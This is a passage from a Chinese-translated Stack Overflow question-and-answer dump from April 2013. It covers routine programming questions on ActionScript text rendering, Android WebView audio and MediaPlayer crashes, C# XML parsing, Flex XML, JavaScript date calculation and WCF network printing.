//textFormat.bold = true;
textFormat.size = 40;
//---------------------------------------------

//
var tf:TextField = new TextField();
tf.text = "Hello world";
/*tf.antiAliasType = AntiAliasType.ADVANCED;
tf.gridFitType = GridFitType.PIXEL;
tf.thickness = 0;
tf.sharpness = 0;*/
tf.setTextFormat(textFormat);
//

//
var bd:BitmapData = new BitmapData(200,200,true,0x00ff00);
bd.draw(tf);
var bm:Bitmap = new Bitmap(bd);
bm.smoothing = true;
addChild(bm);

bm.scaleX = 2;
bm.scaleY = 2; 
```

好运。

# android - 将url加载到webview时如何在后台播放音频？

> ID：15899196
> 
> 赞同：0
> 
> 时间：2013-04-09T10:12:47.687
> 
> 标签：android, url, audio, webview

我想在将 url 加载到前面的 webview 时从后台的资产文件中播放音频文件。任何示例或片段都会有所帮助。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:49:32.490

检查此[答案](https://stackoverflow.com/questions/3149216/how-to-listen-for-a-webview-finishing-loading-a-url-in-android)以了解页面何时完全加载到 WebView 中。

然后添加[实现](https://stackoverflow.com/questions/3289038/play-audio-file-from-the-assets-directory)来播放音频。

# c# - 根据权限解析xmldocument

> ID：15899197
> 
> 赞同：0
> 
> 时间：2013-04-09T10:12:49.973
> 
> 标签：c#, xml, xml-parsing

我一直在处理这个 xml 文档很长一段时间，现在事实证明，根据 xml 文档中定义的权限级别，用户应该能够看到某些字段。这是文档之前的样子：

```
<?xml version="1.0" encoding="utf-8" ?> 
<AccessControl>
    <Field>
      <name>First_Name</name>
      <label>First Name</label>
    </Field>
    <Field>
      <name>Last_Name</name>
      <label>Last Name</label>
    </Field>
......
.....
</AccessControl> 
```

这是解析文档的方式：

```
doc.Load(System.Web.Hosting.HostingEnvironment.MapPath("~/ConfigFile.xml"));
XmlNode root = doc.DocumentElement;
XmlNodeList xnList = root.SelectNodes("/AccessControl/Field");
 foreach (XmlNode xn in xnList)
 {
     string fieldName = xn["name"].InnerText;
     .....
     ....
} 
```

现在我在文档中添加了一些权限节点，其中将包含`field`节点，类似于这样：

```
<AccessControl>
  <Permission Name = "permissionXYZ" >
    <Field>
      <name>First_Name</name>
      <label>First Name</label>
    </Field>
    <Field>
      <name>Last_Name</name>
      <label>Last Name</label>
    </Field>
    ....
  </Permission>
  <Permission Name = "permission123" >
    <Field>
    ...
    ...
    </Field>
  </Permission>
</AccessControl> 
```

如何根据文档中定义的权限仅获取必填字段？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T14:02:00.923

使用 LINQ，您可以根据属性值进行过滤，然后选择字段。我的示例中的 Test.xml 文件仅包含您的示例 XML。

```
 XDocument document = XDocument.Load("c:\\temp\\test.xml");
    var fields = document.Descendants("Permission")
                .Where(i => i.Attribute("Name") != null && i.Attribute("Name").Value == "permissionXYZ")
                .Select(i => i.Descendants("Field")); 
```

# windows-store-apps - TextBlock的背景边框

> ID：15899198
> 
> 赞同：0
> 
> 时间：2013-04-09T10:12:50.363
> 
> 标签：windows-store-apps

我想在 Windows 应用商店应用程序中以编程方式在 TextBlock 周围添加边框。我怎样才能做到这一点？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:47:36.847

创建新项目并在`OnNavigatedTo`事件中添加此代码。

```
protected override void OnNavigatedTo(NavigationEventArgs e)
{
    var tb = new TextBlock() 
    {
        Text = "...TextBlock with border...",
        FontSize = 20
    };

    //To get actual height and width of TextBlock
    tb.Arrange(new Rect(0, 0, Window.Current.Bounds.Width, Window.Current.Bounds.Height));
    tb.Measure(new Size(Window.Current.Bounds.Width, Window.Current.Bounds.Height));

    var border = new Border() 
    {
        BorderThickness = new Thickness(3),
        BorderBrush = new SolidColorBrush(Windows.UI.Colors.Red),
        Height = tb.ActualHeight + 10,
        Width = tb.ActualWidth + 10
    };

    var rootGrid = (Grid)(((Page)this).Content);
    rootGrid.Children.Add(border);
    border.Child = tb;
} 
```

# xml - 在 XML Flex 中的根标记之后为所有子节点添加属性值

> ID：15899202
> 
> 赞同：0
> 
> 时间：2013-04-09T10:13:01.333
> 
> 标签：xml, apache-flex

我无法像为大子节点所做的那样向子节点添加属性。如何做到这一点。我曾经使用过

```
for each(var node:XML in valueXml.item)
{          
  for(var j:int=0; j<valueXml.length(); j++)
  {
     node.@name = valueXml.item[j].item[0].@name;
  }
} 
```

从旧的xml：

```
<item>
  <item name="Subchild1"/>
  <item name="leaf1"/>
  <item name="leaf2"/>
</item>
<item>
  <item name="Subchild2"/>
  <item name="leaf3"/>
  <item name="leaf4"/>
</item> 
```

我需要按如下方式添加：

```
 <root>
   <item name="Subchild1">
     <item name="Subchild1"/>
     <item name="leaf1"/>
     <item name="leaf2"/>
   </item>
 <item name="Subchild2">
     <item name="Subchild2"/>
     <item name="leaf3"/>
     <item name="leaf4"/>
 </item> 
```

我想将每个子节点（“Subchild2”）的第一个子子节点（[Subchild2,leaf3,leaf4]）作为属性名称添加到该子节点。我该如何实现呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T11:12:25.400

到达要添加属性的节点后，您可以简单地为其第一个子节点的名称分配值。

```
var xml:XML = new XML(<root>
  <item>
    <item name="Subchild1"/>
    <item name="leaf1"/>
    <item name="leaf2"/>
  </item>
  <item>
    <item name="Subchild2"/>
    <item name="leaf3"/>
    <item name="leaf4"/>
  </item>
 </root>);

for each (var item:XML in xml.item) {
  item.@name = item.children()[0].@name;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T11:11:41.097

试试这个：

//你的xml

```
 private var xml:XML = new XML(
            <root>
                <item>
                  <item name="Subchild1"/>
                  <item name="leaf1"/>
                  <item name="leaf2"/>
                </item>
                <item>
                  <item name="Subchild2"/>
                  <item name="leaf3"/>
                  <item name="leaf4"/>
                </item>
            </root>
        ); 
```

// 功能

```
 for each (var node:XML in xml.item)
    {
        var attrName:String = node.item[0].@name;
        node.@name = attrName;
    } 
```

//跟踪给出：

```
<root>
  <item name="Subchild1">
    <item name="Subchild1"/>
    <item name="leaf1"/>
    <item name="leaf2"/>
  </item>
  <item name="Subchild2">
    <item name="Subchild2"/>
    <item name="leaf3"/>
    <item name="leaf4"/>
  </item>
</root> 
```

# android - 如何在滚动视图的页面末尾添加可扩展列表视图？

> ID：15899203
> 
> 赞同：0
> 
> 时间：2013-04-09T10:13:01.763
> 
> 标签：android, listview, height, adapter, expandable

我需要将一个可扩展的列表视图放置在在滚动视图中显示一些数据的页面的末尾。基本上列表视图包含页面的一些用户评论。该页面包含大量动态数据，因此只能将其放置在滚动视图中。当我将可扩展列表视图添加到滚动视图的末尾时，它位于正确的位置。但是当我展开列表视图并将父视图设置为换行高度时，列表视图的一部分会被剪掉。我该如何处理。我尝试设置父视图的布局参数来包装内容。但这不起作用。PS：可展开列表项的单元格大小是可变的。编辑：我的 xml 的结构是

```
ScrollView
       LinearLayout  
               Comments layout is inflated here along with some other layouts 
```

评论布局是

```
 LinearLayout
                    Expandablelistview 
```

我正在尝试在 onExpanded & collapsed 计算后动态设置父布局的大小

# javascript - 在Javascript中获取指定日期/时间的下一个实例

> ID：15899204
> 
> 赞同：0
> 
> 时间：2013-04-09T10:13:06.563
> 
> 标签：javascript, date, datetime

如何使用 JavaScript (inc JQuery) 获取表示下一个 11:00 实例的 Date 对象？

我的例子是，如果当前时间是 6 月 2 日星期一的 15:00，我想返回 6 月 3 日星期二的 11:00。同样，如果当前日期是 6 月 5 日星期四 9:15，我想返回 6 月 5 日星期四 11:00。所以它应该根据当前日期/时间返回 11:00 的下一个实例。

这是针对电子商务网站上的发货截止时间（每周日 11:00）的倒计时。

从长远来看，我还想排除周末，例如，如果当前日期是 6 月 7 日星期六的 09:00，它将返回 6 月 9 日星期一的 11:00，但这不是我现在的主要问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:18:20.843

这可能有效：

```
var x = new Date();
var y = new Date(x.getFullYear(), x.getMonth(), (x.getHours()<11?(x.getDay()==0?x.getDate()+1:(x.getDay==6?x.getDate()+2:x.getDate())):x.getDate()+1), 11, 0, 0, 0);
console.log(y); 
```

干杯。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:18:53.813

```
today=new Date()
b=new Date()
b.setHours(11) //11:00 AM, use 23 for 11:00 PM
b.setMinutes(0);
b.setSeconds(0);
if(today-b>0){
  b.setDate(b.getDate()+1)//if you're at the end of the week, it will adjust for you
}
//The following part kicks out weekends:
if(b.getDay()==0||){
  b.setDate(b.getDate()+1) //Sunday becomes Monday
}
if(b.getDay()==6){
  b.setDate(b.getDate()+2) //Saturday becomes Monday
}
console.log(b) 
```

只需将小时设置为 11，与今天进行比较，如果已经发生，则添加一天。

# c# - 打印 WCF - 网络打印问题

> ID：15899205
> 
> 赞同：1
> 
> 时间：2013-04-09T10:13:07.897
> 
> 标签：c#, wcf, printing, network-printers

我的任务是创建一个将指定文件打印到网络打印机的 WCF 服务。我在 C# 中使用 System.Drawing 方法来创建打印方法，但是当我运行它时，我不断收到以下错误消息：

```
{"Settings to access printer '\\\\UKPRINT01\\UKPRINT024' are not valid"} 
```

我在网上查看过，我能找到的唯一建议是在本地安装打印机，但这对于这个特定的 WCF 服务来说并不是一个真正可行的选择。WCF 将通过 Windows 服务托管，它是使用 .net 4.0 和 Visual Studio 2012 创建的。

打印方法代码如下：

```
streamToPrint = new StreamReader(filePath);
try
{  
        printFont = new Font("Arial", 10);
        PrintDocument pd = new PrintDocument();
        pd.PrintPage += new PrintPageEventHandler(pd_PrintPage);
        pd.PrinterSettings.PrinterName = @"\\UKSPPS01\UKSPPRN024";
        // Print the document.
        pd.Print();
}
finally
{
    streamToPrint.Close();
} 
```

# android - 媒体播放器在从最近的应用程序恢复时关闭。表面无效

> ID：15899206
> 
> 赞同：0
> 
> 时间：2013-04-09T10:13:09.803
> 
> 标签：android, video, surfaceview, android-3.0-honeycomb

我有以下情况无法正常工作：

1.  启动视频播放器（活动中带有媒体播放器的片段）
2.  按android主页按钮。（视频暂停）
3.  从最近的应用程序恢复活动。

预期结果：视频恢复。

实际结果：活动已关闭。

其他场景连接多个视频片段：

1.  视频播放。
2.  某事触发事件。
3.  当前片段已分离，并且带有新媒体播放器实例的片段已附加。

据我了解，问题出在这三行：

```
04-09 12:56:47.660: E/Surface(3176): surface (identity=155) is invalid, err=-19 (No such device)
04-09 12:56:47.660: E/OMXCodec(3176): [OMX.Nvidia.h264.decode] dequeueBuffer failed w/ error 0xffffffed
04-09 12:56:47.660: E/OMXCodec(3176): [OMX.Nvidia.h264.decode] mState must be EXECUTING or RECONFIGURING while read 
```

所以问题是：

如何处理这个问题？有什么解决办法吗？

大多数logcat日志：

```
04-09 12:56:47.660: E/Surface(3176): surface (identity=155) is invalid, err=-19 (No such device)
04-09 12:56:47.660: D/CallStack(3176): Surface#00  pc 00013d0c  /system/lib/libsurfaceflinger_client.so
04-09 12:56:47.660: D/CallStack(3176): Surface#01  pc 0001407c  /system/lib/libsurfaceflinger_client.so
04-09 12:56:47.660: D/CallStack(3176): Surface#02  pc 0001460e  /system/lib/libsurfaceflinger_client.so
04-09 12:56:47.660: D/CallStack(3176): Surface#03  pc 0007f628  /system/lib/libstagefright.so
04-09 12:56:47.660: D/CallStack(3176): Surface#04  pc 0007f8f4  /system/lib/libstagefright.so
04-09 12:56:47.660: D/CallStack(3176): Surface#05  pc 00019e52  
04-09 12:56:47.660: D/CallStack(3176): Surface#06  pc 0000f9c8  
04-09 12:56:47.660: D/CallStack(3176): Surface#07  pc 0000dcb0  
04-09 12:56:47.660: D/CallStack(3176): Surface#08  pc 000205d6  
04-09 12:56:47.660: D/CallStack(3176): Surface#09  pc 000206a0  
04-09 12:56:47.660: D/CallStack(3176): Surface#10  pc 00011994  /system/lib/libc.so
04-09 12:56:47.660: D/CallStack(3176): Surface#11  pc 000114e8  /system/lib/libc.so
04-09 12:56:47.660: E/OMXCodec(3176): [OMX.Nvidia.h264.decode] dequeueBuffer failed w/ error 0xffffffed
04-09 12:56:47.660: E/OMXCodec(3176): [OMX.Nvidia.h264.decode] mState must be EXECUTING or RECONFIGURING while read
04-09 12:56:47.660: V/AudioPolicyManager(240): startOutput() output 1, stream 3, session 121 mPhoneState 0
04-09 12:56:47.660: V/AudioPolicyManager(240): startOutput() mLastrefcount 0
04-09 12:56:47.660: V/AudioPolicyManager(240): getDeviceForStrategy() from cache strategy 0, device 2
04-09 12:56:47.660: V/AudioPolicyManager(240): getNewDevice() selected device 2
04-09 12:56:47.660: V/AudioPolicyManager(240): setOutputDevice() output 1 device 2 delayMs 0
04-09 12:56:47.660: V/AudioPolicyManager(240): setOutputDevice() setting same device 2 or null device for output 1
04-09 12:56:47.660: I/AudioPolicyManager(240): Speaker Volume = 0.039811 , device = 2, stream = 3, index = 7
04-09 12:56:47.660: E/AudioPolicyManager(240): speaker volume is normal
04-09 12:56:47.660: I/AudioFlinger(240): start output streamType (0, 3) for 1
04-09 12:56:47.660: D/AudioHardware(240): AudioStreamOutALSA::setParameters() start_output_streamtype=3
04-09 12:56:47.660: E/MediaPlayer(3176): error (1, -2147483648)
04-09 12:56:47.660: V/AudioPolicyManager(240): stopOutput() output 1, stream 3, session 121 mPhoneState 0
04-09 12:56:47.660: V/AudioPolicyManager(240): getNewDevice() selected device 0
04-09 12:56:47.660: V/AudioPolicyManager(240): setOutputDevice() output 1 device 0 delayMs 0
04-09 12:56:47.660: V/AudioPolicyManager(240): setOutputDevice() setting same device 0 or null device for output 1
04-09 12:56:47.660: I/AudioFlinger(240): stop output streamType (0, 3) for 1
04-09 12:56:47.660: D/AudioHardware(240): AudioStreamOutALSA::setParameters() stop_output_streamtype=3
04-09 12:56:47.710: D/WindowManager(303): Setting visibility of AppWindowToken{40aa8e28 token=ActivityRecord{40a3fa08 com.android.launcher/com.android.launcher2.Launcher}}: false
04-09 12:56:47.720: D/MediaPlayer(3176): MEDIA_SEEK_COMPLETE event
04-09 12:56:47.720: E/MediaPlayer(3176): Error (1,-2147483648,80000000)
04-09 12:56:47.720: W/VideoFragment(3176): onError called with error code: 1 / -2147483648
04-09 12:56:47.720: W/EventManager(3176): Ip adress not available =null
04-09 12:56:47.720: I/VideoFragment(3176): onCompletion called
04-09 12:56:47.720: I/VideoFragment(3176): onPause called
04-09 12:56:47.720: I/VideoFragment(3176): onStop called

04-09 12:56:47.720: I/VideoFragment(3176): onDestroyView called
04-09 12:56:47.720: D/MediaPlayer-JNI(3176): setVideoSurface
04-09 12:56:47.720: I/VideoFragment(3176): surfaceDestroyed called
04-09 12:56:47.720: D/MediaPlayer-JNI(3176): setVideoSurface
04-09 12:56:47.730: I/VideoFragment(3176): onDestroy called
04-09 12:56:47.740: W/TimedEventQueue(3176): Event 1550 was not found in the queue, already cancelled?
04-09 12:56:47.740: V/AudioPolicyManager(240): releaseOutput() 1
04-09 12:56:47.750: I/OMXCodec(3176): [OMX.SEC.aac.dec] stopping video source
04-09 12:56:47.750: I/OMXCodec(3176): [OMX.SEC.aac.dec] stopped in state 1
04-09 12:56:47.750: V/OMXNodeInstance(240): calling destroyComponentInstance
04-09 12:56:47.750: V/OMXNodeInstance(240): destroyComponentInstance returned err 0
04-09 12:56:47.750: V/OMXNodeInstance(240): OMXNodeInstance going away.
04-09 12:56:47.750: I/nvos_linux_stub(240): nvos: error = 9 while closing fd = 68
04-09 12:56:47.790: D/dalvikvm(351): GC_FOR_ALLOC freed 616K, 17% free 10746K/12935K, paused 62ms
04-09 12:56:47.880: D/dalvikvm(351): GC_FOR_ALLOC freed 693K, 17% free 10745K/12935K, paused 58ms
04-09 12:56:47.890: I/SurfaceFlinger(237): id=158 Removed RecentsPanel idx=6 Map Size=5
04-09 12:56:47.910: I/SurfaceFlinger(237): id=158 Removed RecentsPanel idx=-2 Map Size=5
04-09 12:56:47.910: D/TabletStatusBar(351): lights out
04-09 12:56:47.950: I/SurfaceFlinger(237): id=159 Removed SurfaceView idx=4 Map Size=4
04-09 12:56:47.950: I/SurfaceFlinger(237): id=157 Removed com.android.launcher/com.android.launcher2.Launcher idx=1 Map Size=3
04-09 12:56:47.960: I/SurfaceFlinger(237): id=157 Removed com.android.launcher/com.android.launcher2.Launcher idx=-2 Map Size=3
04-09 12:56:48.000: I/OMXCodec(3176): [OMX.Nvidia.h264.decode] stopping video source
04-09 12:56:48.000: I/OMXCodec(3176): [OMX.Nvidia.h264.decode] stopped in state 1
04-09 12:56:48.000: V/OMXNodeInstance(240): calling destroyComponentInstance
04-09 12:56:48.000: V/OMXNodeInstance(240): destroyComponentInstance returned err 0
04-09 12:56:48.000: V/OMXNodeInstance(240): OMXNodeInstance going away.
04-09 12:56:48.010: I/SurfaceFlinger(237): id=155 Removed SurfaceView idx=-2 Map Size=3
04-09 12:56:48.020: I/SurfaceFlinger(237): id=159 Removed SurfaceView idx=-2 Map Size=3
04-09 12:56:48.020: I/sfp:jni/libmedia_hc/src/NotificationQueue.cpp:34(3176): Deleting NotificationQueue...
04-09 12:56:48.020: I/sfp:jni/libmedia_hc/src/NotificationQueue.cpp:40(3176): NotificationQueue deleted

04-09 12:56:48.030: W/MediaPlayer(3176): mediaplayer went away with unhandled events
04-09 12:56:48.060: D/WindowManager(303): Desired input method target: Window{40b0e508 com.android.internal.service.wallpaper.ImageWallpaper paused=false}
04-09 12:56:48.060: D/WindowManager(303): Current focus: null
04-09 12:56:48.060: D/WindowManager(303): Last focus: null
04-09 12:56:48.060: D/WindowManager(303): IM target client: android.view.inputmethod.InputMethodManager$1@40ac2368
04-09 12:56:48.060: D/WindowManager(303): IM target client binder: android.view.inputmethod.InputMethodManager$1@40ac2368
04-09 12:56:48.060: D/WindowManager(303): Requesting client binder: android.os.BinderProxy@4171d420
04-09 12:56:48.060: D/WindowManager(303): Desired input method target: Window{40b0e508 com.android.internal.service.wallpaper.ImageWallpaper paused=false}
04-09 12:56:48.060: D/WindowManager(303): Current focus: null
04-09 12:56:48.060: D/WindowManager(303): Last focus: null
04-09 12:56:48.060: D/WindowManager(303): IM target client: android.view.inputmethod.InputMethodManager$1@40ac2368
04-09 12:56:48.060: D/WindowManager(303): IM target client binder: android.view.inputmethod.InputMethodManager$1@40ac2368
04-09 12:56:48.060: D/WindowManager(303): Requesting client binder: android.os.BinderProxy@4171d420
04-09 12:56:48.060: D/InputManagerService(303): startInputLocked: cs=ClientState{4167c8c8 uid 10091 pid 3176}, cs.pid=3176, Binding.getCallingPid()=303
04-09 12:56:48.060: I/WindowManager(303): Placing input method @1
04-09 12:56:48.060: W/InputManagerService(303): Starting input on non-focused client com.android.internal.view.IInputMethodClient$Stub$Proxy@4171d438 (uid=10091 pid=3176)
04-09 12:56:48.060: I/WindowManager(303): Placing input method @1
04-09 12:56:48.060: W/InputManagerService(303): Client not active, ignoring focus gain of: com.android.internal.view.IInputMethodClient$Stub$Proxy@40904cb0

04-09 12:56:48.140: D/WindowManager(303): IM target client: com.android.internal.view.IInputMethodClient$Stub$Proxy@4171d438
04-09 12:56:48.140: D/WindowManager(303): IM target client binder: android.os.BinderProxy@4171d420
04-09 12:56:48.140: D/WindowManager(303): Requesting client binder: android.os.BinderProxy@4171d420
04-09 12:56:48.140: D/CLIPBOARD(381): Hide Clipboard dialog at Starting input: finished by someone else... !
04-09 12:56:48.140: D/CLIPBOARD(303): Hide Clipboard dialog inside hideSoftInput() !
04-09 12:56:48.140: D/InputManagerService(303): startInputLocked: cs=ClientState{4167c8c8 uid 10091 pid 3176}, cs.pid=3176, Binding.getCallingPid()=303
04-09 12:56:48.140: I/WindowManager(303): Placing input method @6
04-09 12:56:48.280: D/dalvikvm(3176): GC_CONCURRENT freed 2003K, 29% free 21660K/30087K, paused 2ms+9ms
04-09 12:56:50.260: D/HierarchicalStateMachine(303): handleMessage: E msg.what=65619
04-09 12:56:50.260: D/HierarchicalStateMachine(303): processMsg: ConnectedState
04-09 12:56:50.260: D/WifiStateMachine(303): ConnectedState{ what=65619 when=-5ms arg1=3 }
04-09 12:56:50.260: D/HierarchicalStateMachine(303): handleMessage: X
04-09 12:56:50.610: V/AudioHardware(240): AudioStreamOutALSA::standby
04-09 12:56:50.610: D/AudioHardware(240): AudioHardware pcm playback is going to standby.
04-09 12:56:50.610: V/AudioHardware(240): closeMixer_l() mMixerOpenCnt: 1
04-09 12:56:50.610: I/alsa_mixer(240): mixer_close
04-09 12:56:50.610: V/AudioHardware(240): closeMixer_l mMixerOpenCnt = 0 end
04-09 12:56:50.610: I/AudioHardware(240): closePcmOut_l() mPcmOpenCnt: 1
04-09 12:56:50.610: V/alsa_pcm(240): pcm_close
04-09 12:56:50.610: V/alsa_pcm(240): real pcm_close
04-09 12:56:50.610: V/AudioHardware(240): closePcmOut_l end
04-09 12:56:53.140: W/PowerManagerService(303): Timer 0x3->0x3|0x1
04-09 12:56:53.270: D/HierarchicalStateMachine(303): handleMessage: E msg.what=65619
04-09 12:56:53.270: D/HierarchicalStateMachine(303): processMsg: ConnectedState
04-09 12:56:53.270: D/WifiStateMachine(303): ConnectedState{ what=65619 when=-4ms arg1=3 }
04-09 12:56:53.280: D/HierarchicalStateMachine(303): handleMessage: X
04-09 12:56:56.280: D/HierarchicalStateMachine(303): handleMessage: E msg.what=65619
04-09 12:56:56.280: D/HierarchicalStateMachine(303): processMsg: ConnectedState
04-09 12:56:56.280: D/WifiStateMachine(303): ConnectedState{ what=65619 when=-3ms arg1=3 }
04-09 12:56:56.300: D/HierarchicalStateMachine(303): handleMessage: X
04-09 12:56:58.340: D/dalvikvm(500): GC_EXPLICIT freed 5373K, 43% free 8596K/15047K, paused 4ms+6ms
04-09 12:56:59.310: D/HierarchicalStateMachine(303): handleMessage: E msg.what=65619
04-09 12:56:59.310: D/HierarchicalStateMachine(303): processMsg: ConnectedState
04-09 12:56:59.310: D/WifiStateMachine(303): ConnectedState{ what=65619 when=-6ms arg1=3 }
04-09 12:56:59.320: D/HierarchicalStateMachine(303): handleMessage: X
04-09 12:57:00.000: I/ActivityManager(303): No longer want com.google.android.voicesearch (pid 2951): hidden #26
04-09 12:57:00.010: D/KeyguardUpdateMonitor(303): received broadcast android.intent.action.TIME_TICK
04-09 12:57:00.010: D/KeyguardUpdateMonitor(303): handleTimeUpdate
04-09 12:57:00.010: I/StatusBar.Clock(351): onReceive:android.intent.action.TIME_TICK
04-09 12:57:00.020: E/AwesomePlayer(240): calling reset
04-09 12:57:00.020: D/AwesomePlayer(240): reset_l
04-09 12:57:00.020: I/AwesomePlayer(240): cancel player events
04-09 12:57:00.020: D/AwesomePlayer(240): cancelPlayerEvents (keepBufferingGoing=0)
04-09 12:57:00.020: D/AwesomePlayer(240): stop AudioSource since AudioPlayer not exist
04-09 12:57:00.020: D/AwesomePlayer(240): reset done
04-09 12:57:00.020: E/AwesomePlayer(240): calling reset
04-09 12:57:00.020: D/AwesomePlayer(240): reset_l
04-09 12:57:00.020: I/AwesomePlayer(240): cancel player events
04-09 12:57:00.020: D/AwesomePlayer(240): cancelPlayerEvents (keepBufferingGoing=0)
04-09 12:57:00.020: D/AwesomePlayer(240): reset done
04-09 12:57:00.020: E/AwesomePlayer(240): calling ~AwesomePlayer
04-09 12:57:00.020: E/AwesomePlayer(240): calling reset
04-09 12:57:00.020: D/AwesomePlayer(240): reset_l
04-09 12:57:00.020: I/AwesomePlayer(240): cancel player events
04-09 12:57:00.020: D/AwesomePlayer(240): cancelPlayerEvents (keepBufferingGoing=0)
04-09 12:57:00.020: D/AwesomePlayer(240): reset done
04-09 12:57:00.020: E/AwesomePlayer(240): calling reset
04-09 12:57:00.020: D/AwesomePlayer(240): reset_l
04-09 12:57:00.020: I/AwesomePlayer(240): cancel player events
04-09 12:57:00.020: D/AwesomePlayer(240): cancelPlayerEvents (keepBufferingGoing=0)
04-09 12:57:00.020: D/AwesomePlayer(240): stop AudioSource since AudioPlayer not exist
04-09 12:57:00.020: D/AwesomePlayer(240): reset done
04-09 12:57:00.020: E/AwesomePlayer(240): calling reset
04-09 12:57:00.020: D/AwesomePlayer(240): reset_l
04-09 12:57:00.020: I/AwesomePlayer(240): cancel player events
04-09 12:57:00.020: D/AwesomePlayer(240): cancelPlayerEvents (keepBufferingGoing=0)
04-09 12:57:00.020: D/AwesomePlayer(240): reset done
04-09 12:57:00.020: E/AwesomePlayer(240): calling ~AwesomePlayer
04-09 12:57:00.020: E/AwesomePlayer(240): calling reset
04-09 12:57:00.020: D/AwesomePlayer(240): reset_l
04-09 12:57:00.020: I/AwesomePlayer(240): cancel player events
04-09 12:57:00.020: D/AwesomePlayer(240): cancelPlayerEvents (keepBufferingGoing=0)
04-09 12:57:00.020: D/AwesomePlayer(240): reset done
04-09 12:57:00.020: E/AwesomePlayer(240): calling reset
04-09 12:57:00.020: D/AwesomePlayer(240): reset_l
04-09 12:57:00.020: I/AwesomePlayer(240): cancel player events
04-09 12:57:00.020: D/AwesomePlayer(240): cancelPlayerEvents (keepBufferingGoing=0)
04-09 12:57:00.020: D/AwesomePlayer(240): stop AudioSource since AudioPlayer not exist
04-09 12:57:00.020: D/AwesomePlayer(240): reset done
04-09 12:57:00.020: E/AwesomePlayer(240): calling reset
04-09 12:57:00.020: D/AwesomePlayer(240): reset_l
04-09 12:57:00.020: I/AwesomePlayer(240): cancel player events
04-09 12:57:00.020: D/AwesomePlayer(240): cancelPlayerEvents (keepBufferingGoing=0)
04-09 12:57:00.020: D/AwesomePlayer(240): reset done
04-09 12:57:00.020: E/AwesomePlayer(240): calling ~AwesomePlayer
04-09 12:57:00.020: E/TODmobile(577): onReceive action=android.intent.action.TIME_TICK
04-09 12:57:00.020: I/StatusBar.Clock(351): onReceive:android.intent.action.TIME_TICK
04-09 12:57:00.030: E/TODmobile(577): hour : 12    minute : 57
04-09 12:57:00.030: E/DigitalClockWidget(577): updateWidgets
04-09 12:57:00.030: E/AwesomePlayer(240): calling reset
04-09 12:57:00.030: D/AwesomePlayer(240): reset_l
04-09 12:57:00.030: I/AwesomePlayer(240): cancel player events
04-09 12:57:00.030: D/AwesomePlayer(240): cancelPlayerEvents (keepBufferingGoing=0)
04-09 12:57:00.030: D/AwesomePlayer(240): reset done
04-09 12:57:00.030: E/AwesomePlayer(240): calling reset
04-09 12:57:00.030: D/AwesomePlayer(240): reset_l
04-09 12:57:00.030: I/AwesomePlayer(240): cancel player events
04-09 12:57:00.030: D/AwesomePlayer(240): cancelPlayerEvents (keepBufferingGoing=0)
04-09 12:57:00.030: D/AwesomePlayer(240): stop AudioSource since AudioPlayer not exist
04-09 12:57:00.030: D/AwesomePlayer(240): reset done
04-09 12:57:00.030: E/AwesomePlayer(240): calling reset
04-09 12:57:00.030: D/AwesomePlayer(240): reset_l
04-09 12:57:00.030: I/AwesomePlayer(240): cancel player events
04-09 12:57:00.030: D/AwesomePlayer(240): cancelPlayerEvents (keepBufferingGoing=0)
04-09 12:57:00.030: D/AwesomePlayer(240): reset done
04-09 12:57:00.030: E/AwesomePlayer(240): calling ~AwesomePlayer
04-09 12:57:00.030: E/AwesomePlayer(240): calling reset
04-09 12:57:00.030: D/AwesomePlayer(240): reset_l
04-09 12:57:00.030: I/AwesomePlayer(240): cancel player events
04-09 12:57:00.030: D/AwesomePlayer(240): cancelPlayerEvents (keepBufferingGoing=0)
04-09 12:57:00.030: D/AwesomePlayer(240): reset done
04-09 12:57:00.030: E/AwesomePlayer(240): calling reset
04-09 12:57:00.030: D/AwesomePlayer(240): reset_l
04-09 12:57:00.030: I/AwesomePlayer(240): cancel player events
04-09 12:57:00.030: D/AwesomePlayer(240): cancelPlayerEvents (keepBufferingGoing=0)
04-09 12:57:00.030: D/AwesomePlayer(240): stop AudioSource since AudioPlayer not exist
04-09 12:57:00.030: D/AwesomePlayer(240): reset done
04-09 12:57:00.030: E/AwesomePlayer(240): calling reset
04-09 12:57:00.030: D/AwesomePlayer(240): reset_l
04-09 12:57:00.030: I/AwesomePlayer(240): cancel player events
04-09 12:57:00.030: D/AwesomePlayer(240): cancelPlayerEvents (keepBufferingGoing=0)
04-09 12:57:00.030: D/AwesomePlayer(240): reset done
04-09 12:57:00.030: E/AwesomePlayer(240): calling ~AwesomePlayer
04-09 12:57:00.030: E/AwesomePlayer(240): calling reset
04-09 12:57:00.030: D/AwesomePlayer(240): reset_l
04-09 12:57:00.030: I/AwesomePlayer(240): cancel player events
04-09 12:57:00.030: D/AwesomePlayer(240): cancelPlayerEvents (keepBufferingGoing=0)
04-09 12:57:00.030: D/AwesomePlayer(240): reset done
04-09 12:57:00.030: E/AwesomePlayer(240): calling reset
04-09 12:57:00.030: D/AwesomePlayer(240): reset_l
04-09 12:57:00.030: I/AwesomePlayer(240): cancel player events
04-09 12:57:00.030: D/AwesomePlayer(240): cancelPlayerEvents (keepBufferingGoing=0)
04-09 12:57:00.030: D/AwesomePlayer(240): stop AudioSource since AudioPlayer not exist
04-09 12:57:00.030: D/AwesomePlayer(240): reset done
04-09 12:57:00.030: E/AwesomePlayer(240): calling reset
04-09 12:57:00.030: D/AwesomePlayer(240): reset_l
04-09 12:57:00.030: I/AwesomePlayer(240): cancel player events
04-09 12:57:00.030: D/AwesomePlayer(240): cancelPlayerEvents (keepBufferingGoing=0)
04-09 12:57:00.030: D/AwesomePlayer(240): reset done
04-09 12:57:00.030: E/AwesomePlayer(240): calling ~AwesomePlayer
04-09 12:57:00.030: E/AwesomePlayer(240): calling reset
04-09 12:57:00.030: D/AwesomePlayer(240): reset_l
04-09 12:57:00.030: I/AwesomePlayer(240): cancel player events
04-09 12:57:00.030: D/AwesomePlayer(240): cancelPlayerEvents (keepBufferingGoing=0)
04-09 12:57:00.030: D/AwesomePlayer(240): reset done 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:25:42.517

